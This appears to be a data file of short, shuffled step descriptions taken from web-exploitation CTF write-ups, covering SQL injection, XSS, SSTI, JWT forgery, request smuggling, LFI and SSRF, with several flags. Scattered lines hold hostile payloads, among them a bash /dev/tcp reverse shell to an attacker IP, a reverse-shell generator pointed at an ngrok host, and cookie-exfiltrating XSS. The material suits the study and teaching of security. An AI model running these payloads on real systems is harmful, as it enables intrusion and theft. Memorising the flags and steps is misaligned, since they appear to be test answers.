    "Identified the flag: 'INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}'",
    "Utilize the Google Chrome Network tab to login with given credentials, and capture the payload of the response, which includes a JWT token",
    "Identified HAProxy configuration protecting the '/flag' endpoint as case sensitive",
    "Used the server's own mechanism against it by setting the 'lion-token' cookie to the generated token to read the contents of 'flag.txt'",
    "Launch multiple HTTP POST requests containing the SQL injection payload to experiment with different values.",
    "Attempted to connect to the homepage but received an error of HTTP method not allowed.",
    "Explore the HTML encoding process of individual characters in the loop function",
    "Identify that the '$hash' and the '$target' are matched using '==' instead of '===' and therefore vulnerable to type juggling",
    "Each character was exfiltrated by redeploying the exploit GitHub page with the updated CSS.",
    "Loop through each character in '0123456789abcdef' (hexadecimal).",
    "Open link 'very.uniquename.xyz:8880'",
    "Finding and downloading a file named configs.zip on the webpage",
    "Visiting the provided URL to view the website contents",
    "Downloaded the 'last-revision' file from the target server.",
    "When transactions were performed, messages were signed using ED25519 to prevent tampering",
    "Identified that one of the admin pages 'report' was vulnerable to an SQL injection from the 'id' parameter",
    "Hit a snag due to restrictions of the `trustedTypes` policy of CSP",
    "Understanding that the secret is not 'secret-[random UUID]' as expected, but it is the string: 'secret-function randomUUID(options) { if (options !== undefined) validateObject(options, 'options'); const { disableEntropyCache = false, } = options || {}; validateBoolean(disableEntropyCache, 'options.disableEntropyCache'); return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID(); }'.",
    "Received a Markdown Editor web application to host notes for a challenge with an admin bot that visits URL submissions",
    "Identify the vulnerability lies in the use of tar utility which incorporates use of wildcards and an option '--checkpoint-action' that specifies execution of a program at a checkpoint, on reaching 10 records by default.",
    "Understood that if the IP is from Norway, YAML parses 'NO' as False, allowing us to bypass escapeshellargs",
    "The base64 data encodes an XMLHttpRequest which retrieves document's cookie and sends to a specified server.",
    "Put together all obtained parts of the flag and was able to guess the first part of the flag that was referred to in the PDF.",
    "Realize that initialization of the 'mfa' attribute as a reference to the '_correctValue' attribute allows to bypass the MFA check.",
    "Crafted an HTTP request to the chat endpoint with the aim of stealing the VIP user's cookies",
    "Identified missing file escape for characters on the filename from the logic",
    "Notice that the 'magic code' is actually present in the payload returned by the server",
    "Check the response for the text 'No such person'. If this string is not found, it means that the guess was correct -- that character exists in the password at that position.",
    "Using the 'subprocess.Popen' class to spawn a reverse shell.",
    "Attempted XSS payloads, realized that rendering unescaped HTML was hopeless due to the app being rendered on a `<canvas>`.",
    "Discovered that '/lib/db/user.db' and '/lib/db/passcode.db' can be directly accessed from the server.",
    "Identify the code also normalizes file paths to prevent directory traversal attacks.",
    "Encoding the payload in base64 and adding it to the URL",
    "Decided to try sending a fake IP address in the headers using the 'X-Forwarded-For' field.",
    "Constructed a base to perform SQL injection",
    "Ran another series of SQL queries via URL manipulation to obtain column names from information_schema.columns",
    "Used cURL command to send a POST request with 'user' and 'pass' as 'karma'",
    "Intercept a GET request to /jwtlogin that returns an HTTP 401 UNAUTHORIZED status",
    "Click the captcha boxes until you successfully get all 5 captchas",
    "Identified a potential SQL injection vulnerability",
    "Open link 'overly.uniquename.xyz:2095' in web browser",
    "Noticed that one gallery was set to private and could not be unnecessarily accessed.",
    "Visited the site and analysed the given hyperlinks.",
    "Created the finalized payload, crafted directly into a representation of a session cookie that would be expected by the application",
    "Ran grep to search for unusual text in the logs, disregarding common words",
    "Created a function `http_get` in the Python script to get the response, checking if PNG was found in the response",
    "The description of the challenge clarifies that the flag is in the MySQL 'flag' table",
    "Considered the XML-related error spawned previously and the hint provided into the <flag> element talking about a '/flag' file.",
    "Sent the final payload URL as a request to the server at 'http://18.179.178.246:8003'",
    "Identified that the input was being reflected into an XSL document",
    "Understand that 'notes.count' applies a filter and returns the count of notes that pass this filter",
    "Identified that the website simulates a TODO list application",
    "After a break, returned to the problem with a clearer perspective.",
    "Identify the website's vulnerability to XSS.",
    "Login with the newly promoted 'Admin' user and access the book containing the flag.",
    "Identify the problem with brute force: JWT success counter is reset to 0 if the old token is invalid and expiry was not extended for failed solving attempts.",
    "Create a token with the overridden '[object Object]' as the secret key and 'flag.flag' as the 'id' to purchase the flag from the store for $1.",
    "Utilized an XSS attack to redirect the browser using the `Location` header.",
    "Discover that HTML files are uploaded successfully despite checks for images, but they don't execute on the server side, instead, they are downloaded with random filenames",
    "Failed at multiple attempts to get reverse shell using 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1' as a command.",
    "Use 'cat cmd.php' command to view the code, which reveals the blacklist filter.",
    "Connected to the website and observed it has directory listing active",
    "Found that there were no escaping countermeasures for the ':' character",
    "Despite possible truncated output, the SQLmap did retrieve the flag 'ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}'.",
    "Accessed 'robots.txt', discovered a disallowed route '/fade/to/black'",
    "Retrieved the flag from the table content",
    "Decoded the base64 response to reveal the challenge flag",
    "Received a PNG image from the 'CONNECT /two/' request.",
    "Understand the need to 'steal' an admin cookie and gain admin access, but encounter the HttpOnly problem",
    "Once successful, noted the steps taken to reproduce the attack.",
    "Understand that this approach seems to be working but manual checks are not efficient",
    "An excerpt button on the page performs a HTTP GET request to '/books.php?type=excerpt&id=1'.",
    "See a page notifying about an incorrect login, and suggesting to visit recently acquired companies. Notice that one of the mentioned company names points to 'Robots.txt'",
    "Go to the rule page.",
    "Accessed challenges",
    "Attempted to inject code with an embedded script, but it failed",
    "Determined a method of bypassing the Jinja2 SSTI filters using GET request arguments and accessing them through `request.args`",
    "Examine 'build.sh' script referenced in the GitHub Actions file and determine that it uses the 1st command-line argument as the value assigned to a macro",
    "The Prototype Pollution vulnerability was confirmed from an external source, a GitHub Pull Request.",
    "Learn that an older version of SQLAlchemy is being used and recognize its vulnerability to an SQL injection attack",
    "Revisited the page with the newly acquired 'admin' cookie, which allowed access to the `/flag` endpoint and revealed the flag.",
    "Write script to automate this process of generating payloads and making POST requests.",
    "Observe that the JavaScript code prevents 'script' tags and allows only certain attributes for an element",
    "Investigated the source code of the website looking for any unusual strings.",
    "Append the xss=<script src=\"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/sha512.js\"> parameter to the query so the sha512.js script will be filtered and the DOMValidator.js will crash, resulting in <script>alert('pwned')</script> being executed",
    "Use 'nodejsshell.py' to craft such a payload, with the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel",
    "Noticed a flaw in check condition where it checks if iframe is not an object instead of checking if iframe value is not an object.",
    "Identified that the webpage is vulnerable to SQL injection as the query in the PHP code was concatenating user input directly",
    "Ran the server script with a new payload '?icecream={{application.settings[\"cookie_secret\"]}}' to retrieve the cookie_secret value 'MangoDB'.",
    "Altered the 'not_admin' cookie's value from '1' to '0'",
    "Iterated over all composited 152-digit long '$NUMBER$' using the 'max(A, B)' SQL function which returns the larger one",
    "Retrieved the received private key and used it to SSH onto the target server.",
    "Identified that 'redirect()' function did not actually terminate the script, but printed HTML output, allowing further code execution.",
    "This function adds our user provided query to the database and then calls 'bot.readQueries(db)'.",
    "Created a SQL injection payload to extract flag data from the server",
    "Signed up on the website and viewed the invoice URL, which was in the format '/legacy_invoice_system/BASE64_ENCODED_STRING'",
    "Find flag in the database dump: 'CTFSG{A_Cru3l_Summ3r_W1th_SAO_RELEASE_RECOLLECTION}'.",
    "Logged in again with the deduced password to get the flag",
    "Accessed 'http://challenges.auctf.com:30020/robots.txt' on the browser",
    "Noticed that `shell_exec` was mentioned on the website.",
    "An initial inspection of the webpage to understand its functionality",
    "Found the flag file 'flag.jpg' in the checkout version of the repository. The flag was 'darkCON{g1t_d4_fl4g}'",
    "Found and endpoint for creating new users '/dogooo/user/create' which is also accessed only by authenticated users",
    "Tried using an SQL injection on the challenge platform (inputting ' OR 1=1--')",
    "Analyzed the requested pages and tuned the starting point of the redirection",
    "SQLmap, an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws, is used to retrieve information.",
    "Tried to access port 9006 directly but didn't get meaningful information.",
    "Conducted an extraction of the flag character by character leveraging the navigation function and the XS leak",
    "Aquired the flag.",
    "Recognize that there are so-called 'magic hashes' that PHP would consider equal",
    "Bruteforced the flag one character at a time using the SUBSTRING and SLEEP functions",
    "Note that every 3000 attempts, the CAPTCHA code needs to be updated manually in the script.",
    "Examine the website interface, which includes a login screen and a main screen with book selections.",
    "Develop a plan for object injection: Bypass MFA token check by setting `$mfa_token` as a reference to the `$_correctValue` attribute, and bypass SQL by modifying the `$query`.",
    "Understood that the `'re.match'` only matches at the _beginning_ of the string, allowing for wildcards at the _end_ of the email",
    "Expected that one of the nonces will work when the admin visits the page",
    "Interpret the hint provided: 'We will only give our flag to our Agent 95! He is still running an old version of Windows...', implying that the User Agent in the request header needs to be one that matches Windows 95",
    "Then it compares it with a 'hash' value",
    "Gather a list of subclasses returned as a result",
    "Identified students may have weak passwords",
    "Interpreted that the architecture consists of a proxy ('haproxy' 1.9.10) and several hosts behind it ('gunicorn' 20.0.0), which operate the app.",
    "Discovered the flag within the content of the index.php file",
    "Discovered that passing integers larger than 9223372036854775807 will get them cast into floating numbers",
    "Submit and receive the flag",
    "Recognize that the challenge focuses on hacking the JWT cookie",
    "The SQL command is modified as 'SELECT id FROM users WHERE password = '' or 1=1;--' and username = '123'",
    "The website is a renderer for LaTeX code; a LaTeX script can be written and the generated PDF can be seen via a provided link. The output LOG of the LaTeX rendering is also displayed.",
    "Realized that removing a portion of the 'counter' cookie triggers a zlib Input Error",
    "Take note of the Nginx configuration that rewrites the URL using the host header",
    "Used LFI to include '/tmp/pwn.php' using 'GET /?page=../../../../tmp/pwn.php HTTP/1.1'",
    "Recalled an example from a known website (crunchyroll.com) where a Cloudflare error was triggered by SQL injection",
    "Copy the flag found in the content attribute: `flag{1nspector_g3n3ral_at_w0rk}`",
    "Learned of an existing bypass in Chrome for the version of DOMPurify the application was using, which abused strange behaviors of `<math>` elements.",
    "Provided with a website with functionalities for login/register, edit profile, and support",
    "Realized that the 'id' parameter could be manipulated because the program only casts the integer part.",
    "Wrote a Python script to extract out the most commonly occurring source IP (src_ip) from the CSV files",
    "Finding the 'subprocess.Popen' class at index 405.",
    "Implemented a smart voter script that utilizes a previously saved cache. This minimizes the time spent on creating strings that match the challenge given by the server.",
    "Using the new role, created an EC2 instance that triggers a reverse shell on startup",
    "Discover that the /find endpoint can be used for Response Header Injection.",
    "Found that the site only allows images of the same origin and script tags with nonces as external resources",
    "Injected a UNION query to retrieve table names",
    "Analyze 'calc.js' and identify controllable variables",
    "Furthermore, 'admin' is replaced non-recursively.",
    "Search for HTTP packets within the packet logs.",
    "Identified the endpoint for the POST request from the index.html file.",
    "In WASM, ASLR doesn't exist. We can therefore predict the address where our XSS payload will be inserted - this information can be obtained by debugging with Chrome DevTools.",
    "Understood the constraints of the language input due to a regex check",
    "Fetch further missing git objects from the server",
    "Unusual thing here is that the error is shown in a javascript alert",
    "Received a webpage from the '/com/seaerch/' endpoint.",
    "The JavaScript code responsible for password checking was obfuscated, making analysis more challenging",
    "Identified Server Side Request Forgery (SSRF) vulnerability in '/cornelia'",
    "Identified that 'basename()' function ignores invalid characters in the PHP script",
    "Navigated to the simple quiz section",
    "Retrieved the flag by dumping data from 'startup_users' table again, this time concatenating 'wordpass' values using the GROUP_CONCAT function",
    "Exploiting Shellshock again to print contents of 'flag.file'",
    "Retrieved the flag",
    "Understand the need of overcoming file extension restrictions to implement a successful attack.",
    "Requested the /fuel endpoint, received a list of pumps and their IDs",
    "Identify that the goal of this CTF problem is to bypass WAF protection to access local resources",
    "Understand that this time a POST request must be sent to '/profile/request' with the 'id' of the attacker's user embedded in the request body",
    "Used the `onLoaded` event handler to trigger the `api_post` event for zero-click exfiltration.",
    "Used SHATTERED to exploit the SHA1 vulnerability and create two PDFs with the same SHA1 hash",
    "Observed the output on my netcat listener, which included the CTF flag",
    "Sign a token with the public key verifyKey and set 1501 as the number of boops",
    "Executed a Python script that sends GET requests with incrementing 'id', retrieves data, decodes the base64, and appends the result to a file.",
    "Researched ways to bypass PHP constraints",
    "First, the attacker found an API which is used to modify the status of the services.",
    "Recognize that the page allows you to upload a custom HTML page and report suspicious URLs to the admin",
    "Log in to the website using the username 'jack' and the discovered password",
    "Used extractor tool to get files from the dump.",
    "Assumed an admin visit to the site and constructed a CL-TE request smuggling attack to direct the admin to '/save.php'",
    "Attempted to exploit the log4j vulnerability using the 'ProfileServlet.java' and a malicious cookie value",
    "When the correct tripcodes match, retrieve the corresponding IP address and form the flag",
    "Checked the login page source code and docker files",
    "Find a way around the restrictive regex check by submitting same payload multiple times",
    "Use S3Scanner to dump the contents of the suspect S3 bucket using 'python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com'",
    "Injected another cookie named 'authenticated-user' with value 'true'",
    "Understand the structure of the store object, noting if there are any properties that are not defined initially but used later.",
    "Visited the challenge link which mentioned logging in via POST and using json request",
    "Identified the challenge as a beginner SQL Injection challenge.",
    "Found the flag in the backup/b/a/c/flag.txt file.",
    "Unlock and buy the 'flagsword', completing the challenge.",
    "The page source looked normal so I proceeded to intercept the login request with burpsuite",
    "Created two endpoints, `/evil/` for cookie grabbing script and `/cookie/` for receiving exploited cookies",
    "Call the function addCaptcha() manually to add 5 captchas on your screen",
    "Performed a command injection into the vulnerable points in the script",
    "Switched to the user 'ctf' using the password 'csictf'",
    "Analyze HTTP traffic: Use tools such as the network tab in your browser's developer tools or Wireshark to analyze the format of request/response packets",
    "Created an XML HTTP request that references the /etc/flag.txt directory",
    "Accessed the Startup Company web page",
    "Performed parameter pollution on the frontend with 'GET /callback?user=FRONTEND_USERNAME&amount=1337&amount=0&nonce=NONCE&sig=SIGNATURE'",
    "Developed a Python script to automate the brute-forcing of characters",
    "Use brute force to solve for a set of possible solutions for 'c' and 'prev_encoded_arr[0]'. Narrow down the solutions by progressing through succeeding elements of 'prev_encoded_arr[]'.",
    "Noted that the second request 'GET /save.php HTTP/1.1' is not yet completed after the end of the first request",
    "Retrieved the 'id' of Maria from the user table.",
    "Attempt SQL injection using MySQL comments in place of spaces.",
    "Attempted a SQL Injection on data passed using fragment values",
    "Built an HMAC(HS256) token using the public key as a secret, crafting a token with 'admin' as the user.",
    "Initiated data leaking process",
    "Found that the second 'If' statement presented an opportunity to be bypassed. Used the same value for both the 'pass' URL parameter and the User-Agent to exploit the PHP's type conversion",
    "Use the 'tryNumber' function to navigate to the '/checkbalance' endpoint with a queried amount.",
    "Found and untick a box inside the admin panel making the private gallery public.",
    "Exploit the LFI vulnerability to execute the 'changelog.js' script by sending a POST request to the '/api/tet/years' endpoint with a JSON payload in the request body specifying the 'changelog.js' script in the path.",
    "A Python-based environment was set up to assemble and debug a shellcode",
    "Used GROUP_CONCAT function to concatenate all retrieved table names into a single string",
    "Realize that a shell can be inserted into an image",
    "Visited the provided webpage and accessed HTML source to find clues",
    "Started searching each revision with adjusted script to identify any differences made.",
    "Setup a request, with differing 'Content-Length' header values, taking advantage of the Flask server's failure to comply with RFC norms",
    "Converted the base64 string 'SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9' to ASCII using terminal",
    "Understand that the client-server communication uses an encoding function which involves two keys - 'key' and 'key2'.",
    "Base64 encode the flag.png as part of the request payload to prevent unintended data loss or corruption",
    "Create a new user with a malicious username '{open('/flag').read()}' that could trigger a Remote Code Execution during the authentication",
    "Executed '/bin/ls .' to list the contents of the current directory on the Challenge server.",
    "Used the located credential to login on 'admin.html'.",
    "Analyzed the provided PHP source code for the application's authentication process",
    "Used '127.0.0.1;env' in URL to list environment variables, but found no useful information.",
    "Realized that the ATS server forwards the entire payload as a single request to the Nginx backend, while Nginx sees the 'Transfer-Encoding' header and considers the first request ended",
    "Identified the need to rearrange 'P4s5_w0Rd' into 'sRPd45w_0' to get the correct password.",
    "Received a page showing successful entry and the flag",
    "Understood that 'JSON.parse' allows the '__proto__' key, storing it as ['__proto__']",
    "Looked for files that could be overwritten, but couldn't modify anything in '/home/manhndd/.ssh/' due to a lack of appropriate permission",
    "Found a 'flag' file in the folder content",
    "Realized an intended solution involved exploiting a HTTP request smuggling vulnerability in HAProxy version 2.4.0",
    "Realized that the resulting template is user-controllable, as 'login' is the username",
    "Understand the basics of game: The website is a game where you must click on the circle and not click on the squares, placed randomly every round, to get more than 20 clicks in 10 seconds",
    "Explained the function syntax. SUBSTRING requires three arguments: the string to check, the position to check, and the length to check. Used the IF function which also needs three arguments: the condition, the action if true, and the action if false",
    "Evaluating sequential requests determined that this the 'counter' cookie string ends with a changing base64 encoded string",
    "Scanned each discovered username for potential files associated with them",
    "Sent a `POST` request to '<url_of_site>/data' with the crafted XML payload.",
    "Explore the alternative of exploiting Cross-Origin Resource Sharing (CORS) policy violation as a faster and more efficient method",
    "Identified how to leverage the prototype pollution to run 'require('./usage')'",
    "Used the primary segment to create a URL that would circumvent the '/debug*' restriction.",
    "Started a HTTP server, created the '/static/js' directory structure, and placed XSS payload in 'marked.min.js'.",
    "Wait for the site to load. Depending on the balance, the window may be redirected to '/'.",
    "Attempt command injection, noting there appears to be a blacklist filter.",
    "Detect that the JavaScript file 'bundle.js' is used to calculate the hash value.",
    "Use the retrieved 'magic code' to complete the login on the website",
    "Identify that the 'login_session_token' is used when making a query to 'mfa_service.php'.",
    "Identified that one database contains 'bcrypt' hashes and another contains 'md5' hashes.",
    "Understand the CAPTCHA generating code, which uses random numbers to make the CAPTCHA text.",
    "Understand from the pull request that it's possible to trigger Server Side Request Forgery (SSRF).",
    "Pull `.git/index`, `.git/config`, `.git/HEAD`, `.git/refs/remotes/origin/master`, `.git/refs/heads/master`, `.git/logs/HEAD` from the server",
    "Further inspect 'functions.php' file revealing a function that validates the input of a UUID. Understand that the input format for the SQL injection should match the UUID format",
    "The PHP code reveals a connection to the MySQL server before executing the shellcode",
    "Found the URL of /robots.txt.",
    "Used Python scripting and the 'mutool' command to manipulate the PDF files.",
    "Download and analyze the PCAP file for POST requests passing 'passcode' values",
    "Successfully display the differences between the two git commits and thus retrieve the flag",
    "Login into the system",
    "Used the directory listing to identify a 'print-flag' file and downloaded it by accessing 'http://lowdeep.insomnihack.ch/print-flag'",
    "Site has a login screen",
    "The challenge involved an application where the markdown input gets converted into a PDF file available for download",
    "Investigating the requirements and specifications of an uploaded zip file which should contain a `run` bash script",
    "Enumerated the 'id' and found that the range between IDs '18446744073709551463' to '18446744073709551615' correspond to the router's RAM, hence the RAM can be dumped this way.",
    "Performed a HTTP GET request with a header named 'answer' containing the trivia answer 'Fear the Old Blood'",
    "Observe that user input being passed to 'require()' leads to a Local File Inclusion (LFI) vulnerability.",
    "The website allows us to view some properties about a Linux system. The output looks just like standard Linux commands. The output of the 'List Storage' command seems to be executing 'df -h'.",
    "Redirection to `/users/<username>/files` is observed after registration where file upload capability is noticed",
    "Created a new directory named 'ctf-bzr' and initialized a Bazaar repository.",
    "Use the curl command to GET the page",
    "By using the new admin JWT token, made a request to /flag to get the flag.",
    "Acknowledge that extra checks were implemented to necessitate XSS within the Chromium renderer and utilizing the 'localhost:3000' origin to avoid the Same Origin Policy",
    "Read the Apache configuration file which revealed mapping, leading to the hypothesis that the web app could be stored in the same directory",
    "Gain admin's acceptance as a follower and finally find the flag within a fan post, completing the challenge",
    "Crafted a URL that appended an HTML header tag to the domain part of the email parameter, thereby exploiting the lax character restriction.",
    "Encounter additional missing git objects",
    "Identification of two endpoints `/getflag` and `/cookies`",
    "Spot an interesting behavior with 'RegExp.prototype.test()' used with regex containing the global flag. This trick helps continue the search from the previously found index onwards and it can allow multiple instances of 'fqdn'",
    "Submitted the final payload to complete the challenge",
    "Extract the flag: `actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}`",
    "Decoded the base64 encoded result to obtain the flag.",
    "Used a GET request to access the cache data that triggers the command execution on the server side",
    "Pass the username as ','\"member\":\"1', which changes 'member' to a non-zero value.",
    "Study and understand the given client-side web exploitation challenge, where a URL is submitted to an '/share' endpoint which is then visited by an admin bot",
    "To exploit this, we insert code into the /redirect that will change the password of the admin when the admin clicks the URL.",
    "Identified a flag table in the database",
    "Found `flag.txt` in the root directory",
    "Use '<base>' tag to rebase the URL to attacker-controlled site",
    "Use the new session cookie to log into the site, either by intercepting an HTTP request or using a cookie editor tool",
    "Observed that when sending an SMS to a number that does not begin with '+1337' or '1337', the 'send_sms' function in 'sms.py' is invoked",
    "Visited the website that allows file uploads",
    "The JavaScript sends a POST request to the remote server, exfiltrating the contents of the 'flag' file",
    "Identified a Server-Side Template Injection (SSTI) vulnerability on a Flask webpage with certain blacklisted words as restriction",
    "Found that when converting to upper case, the Unicode character '\u00df' turns into two characters 'SS'. This allows us to bypass the JavaScript's check of rejecting any character with charCode greater than 128.",
    "Tried a wrong HTTP verb which made the server return all allowed methods.",
    "Noticed that a 'note' is 'found' as long as 'note.startsWith(request.search)'",
    "Execute the request to get the flag",
    "App was composed of frontend and payment backend with separate user accounts",
    "Checked server responses to identify Apache server version (2.4.49)",
    "Identifies a Server-Side Template Injection (SSTI) vulnerability in the password field within the code.",
    "Visited `https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env' to print the content of the environment file",
    "Read the file 'flag210d9f88fd1db71b947fbdce22871b57.php' using the same technique applied during reading of 'config.php'",
    "Connecting to URL finds default Apache2 installation page",
    "Step 7: A check is performed to see if the response text contains 'check', a predefined string that is expected in the response of the successful login.",
    "Understood that this works as 'password' = 'username' evaluates to 0 and then 0 compared with 'michelle' returns true",
    "Create a payload that would fit the constraints and retrieve the flag.",
    "While testing the app, discovered that it uses curl for certain inputs.",
    "Decide to use the same strategy to make admin accept the follow request",
    "Ran the PHP exploit and got the flag reading from a file in the '/etc' directory",
    "Modify the available PoC to suit the given context",
    "Inspect source code on feedback form page and discover feedback is sent via XML composed by JavaScript.",
    "In this script, manipulate the multiple URL opens to actual browser window opens.",
    "Examining the source code found that both 'RS256' and 'HS256' algorithms are allowed for decryption in 'challenge/helpers/JWTHelper.js' indicating a potential JWT exploit (CVE-2016-5431/CVE-2016-10555).",
    "Verified that /users.php?id=1 returns the data for user ID 1.",
    "Modified the exploit script to target the provided site and the located /flag.txt.",
    "Recognize this as a code injection challenge.",
    "Visited http://35.207.91.38/backup/.DS_Store to download a .DS_Store file.",
    "Received a PDF file from the '/circle/one/' endpoint.",
    "Converted the Base64 string into hexadecimal format. Identified as a Bitcoin Wallet password.",
    "Submitted this payload 'csrf&username=michelle&password[username]=michelle' which makes password an object",
    "Put together all obtained parts of the flag and was able to guess the first part of the flag that was referred to in the PDF.",
    "Used 'hex2bin' PHP function to convert the hexadecimal values into binary data",
    "Analyzed the 'entrypoint.sh' bash file and noted the MongoDB storage of a password with username 'admin'",
    "Clone S3Scanner from GitHub repository using 'git clone https://github.com/sa7mon/S3Scanner.git'",
    "Pass any one of these hashes with the GET parameter 'hash' to the server",
    "Observe that exploiting the vulnerability will be challenging due to its location after the ORDER BY clause",
    "Checked that balance never went below 0",
    "Acknowledge that any flags in the response body will be replaced by the Nginx frontend and this challenge cannot be simply solved via redirects to 'http://app/login.php'",
    "Combined both parts of the flag to solve the challenge.",
    "Since the variable 'mfa' was created by unserializing user requests, it was possible to make 'mfa' and '_correctValue' match by using object injection.",
    "The server uses dynamic rendering, which renders JavaScript on the server-side before serving web crawlers.",
    "Tenth step: Created a PHP script to redirect to itself 19 times, before redirecting to the target URL.",
    "Observe the returned flag",
    "Attempted to access /server-status and was successful",
    "Logged in with user credentials",
    "Accessed robots.txt to find interesting entries",
    "Constructed a JavaScript payload to be run on the victim's browser that loads an iframe of the notes site with a search query and measures the time taken to fetch 'y.png'",
    "Recognized a potential SSRF vulnerability associated with `wkhtmltoimage` from previous knowledge and references",
    "Injected final payload to initiate the XSS to send the cookies from the server to the `/cookie/` endpoint",
    "Intercepted 'oauth tokens' by stopping the request from 'twitter' to 'yeunote' before it gets executed using burp tool.",
    "Given login credentials for an online portal with MFA and Captcha code protection.",
    "Examine the init() function of the website, which changes the displayed note's innerHTML to the /get response on load.",
    "Executed a HTTP POST request with '__proto__' as username to set settings",
    "Use the discovered security question answer to bypass the security check and log in as the 'admin' user",
    "Construct a parameter that both meets the conditions and requests the flag file. `['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js']` is passed in an array via the GET parameter so that only the first five elements are used to create the file name, which then resolves to `flag.txt` after the process",
    "Deduce that the '$ne' filter checks if the body of the notes is not empty",
    "Craft a JavaScript snippet that sends a GET request to the '/profile/follow' endpoint, which would theoretically make any user that accesses a page with that script embedded follow the attacker account",
    "Concluded that the challenge involves XML External Entity (XXE) from the use of the `XXE` tag and the 'xmlDetailsCheckPayload.js' file.",
    "Confronted with stability issues with multiple users trying to attack using sqlmap simultaneously",
    "Summarize that the flag must be 'zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}'.",
    "Used automated tools or manual testing to check for error messages indicative of XPath Injection.",
    "Examined provided source code of the website which only signed PDF files if they contained 'ECHO' in the text",
    "Analyze the JWT using jwt.io",
    "Made a GET request with the payload.",
    "Found that the user's cookies are sent along with the POST request, and if /api/filter endpoint returns sensitive, user-specific data based on these cookies, this information could be read",
    "Used similar approach to bypass '.' character for callback domain and '\"' character for bash command",
    "Identify that the formula points to another sheet's labeled 'Source' and a specific range 'A:B'",
    "Added debug prints to the file for the GET path and POST filename to confirm the suspected vulnerability",
    "Explored the file /static/js/main and found another part of flag: us3full_1nf0rm4tion}",
    "Created a 'foo.txt' file, added it to the repository, committed changes and then removed it.",
    "Read the 'flag.txt' file using the root shell, successfully getting the challenge flag",
    "Used 'Redirect 307' to read arbitrary files, such as '/etc/passwd'.",
    "Create a SQL Injection payload that uses a wildcard pattern and append the current character. 'or password like {}{}%' --' would check if the password starts with the current guessed string.",
    "Visited the webpage and found a part of a flag: CHTB{",
    "Intercepted the register request to inspect the parameters being sent",
    "Identify the existence of a WebSocket tunnel from the 'HTTP/1.1 101 Switching Protocols' packet.",
    "Crafted an SQL injection payload bypassing the filter limit",
    "Download the '.env' file, which contains the JWT secret.",
    "Read the Python source code for the web app, found faulty secret key handling",
    "Ran the PHP shell, but it was unsuccessful",
    "Understand the 'vsCAPTCHA' app written in TypeScript and Deno.",
    "Replace the existing `login` cookie with the new base64 encoded malicious payload",
    "Found out the intended solution involves bypassing the cache partitioning by controlling a subdomain matching the site domain, as subdomains and port numbers are ignored in cache keys",
    "Create a base64-encoded payload to bypass the blacklist, using a payload that reads the desired file.",
    "SQLmap results show that the 'ASISCTF' database has one table named 'books'.",
    "Conducted experiments with different content and observed the server's response which suggested Server Side Template Injection",
    "Visited the provided site and encountered the text 'Hello Mars!'.",
    "Identified the necessary conditions to be satisfied according to the code. It includes specific query string parameters, a user-agent, and a 'GET' request that needs to have two different parameters having the same md5 hash",
    "Successfully extracted the user and corresponding password token via SQL Injection",
    "Note the condition within the 'admin_status' function that only returns the flag if the request is coming from a '127.0.0.1' IP address",
    "Identified the presence of SQL object within User Class which executes SQL queries for user authentication",
    "The max length of 'n' can be '8', any entry larger will result in an error",
    "However, adding anything _before_ the '<link>' tag fixes this behaviour, such as using 'asdf<link rel='stylesheet' href='...'>'.",
    "Injected another cookie named 'visited-main-page' with value 'true'",
    "Encode a new JWT token with role 'Admin'.",
    "Find that the password is 'congratsyouwin' via the bruteforcing method",
    "Making a GET request to /secret.html and observing that the contents of 'secret' tags are replaced with 'Protected'",
    "Double quoted the payload for PHP to treat our payload as a single string argument, resulting in '/santa_mon.sh \"curl http://localhost:3000/get_flag\"', consequently executing the desired command and getting the flag output from the server.",
    "Created a payload `\"><svg/onload=$.globalEval(name)` with length of '32 bytes' where 'name' is a short form of 'window.name' property",
    "Used 'window.localStorage.getItem' similar to 'window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]' to check our input password against the split parts",
    "Started brute forcing process to gain access",
    "The 'read online' button opens a window redirecting to a link specific for each book.",
    "Copied the output and used a Python script to find `<class 'subprocess.Popen'>` in the subclasses and found it at index 258",
    "Observing within the content of the page that there is a 'secret' tag which contains the flag",
    "Retrieved the flag from the URL parameter",
    "Used the discovered page URL (`http://0.0.0.0/Secret_admin_cookie_panel`), received a `Set-Cookie` header from this page for a new cookie with HttpOnly flag set.",
    "Realized that by adding X-Forwarded-For: 127.0.0.1, an SSRF is possible to the /sakura endpoint. As the cached secret is only available for 2 seconds after logging in, the SSRF request must be made immediately after login.",
    "SQLmap results showed that a '<flag>' XML element is hidden into the 'books' table but not in the book with 'id = 1'.",
    "Visited the disallowed route and obtained the flag",
    "Controlled 'Version' in cookie to get arbitrary code execution;",
    "Found information on Angular's secondary segments in paths.",
    "Discovered a script on the `index.php` page calling `api.php` endpoint",
    "Identified this hexadecimal string as the AES ECB key for decoding the Bitcoin Wallet password.",
    "Then, the attacker checked all npm packages for vulnerability and found that a package name fast-json-patch is vulnerable to Prototype Pollution.",
    "Decode the initial array with base64 encoded strings in the JavaScript script",
    "Use 'ls' and 'cat' commands to explore files",
    "Examined the HTML source code of the page which revealed default credentials.",
    "Visited /app and found a web proxy application.",
    "Used `python3 solve.py` to exploit the LFI vulnerability.",
    "Connected to the 'README' file in the '.bzr' directory and confirmed the existence of a Bazaar repository folder.",
    "Established the flaw in the validation mechanism - the URL is fetched twice, once to check for an SSRF attempt and again once it's deemed legitimate.",
    "Confirmed suspicion about server behaviour by setting up a wildcard DNS listener. Request to '/pleb.mysub.dnsbin.zhack.ca' returned DNS query for example.com.",
    "Connected to the provided URL, which is a file sharing site",
    "Access the provided URL and study the given codes on the page which are written in PHP",
    "Provided with a URL and Docker file for the challenge.",
    "Discovered several directories including /app and /flag.txt, the latter of which was inaccessible.",
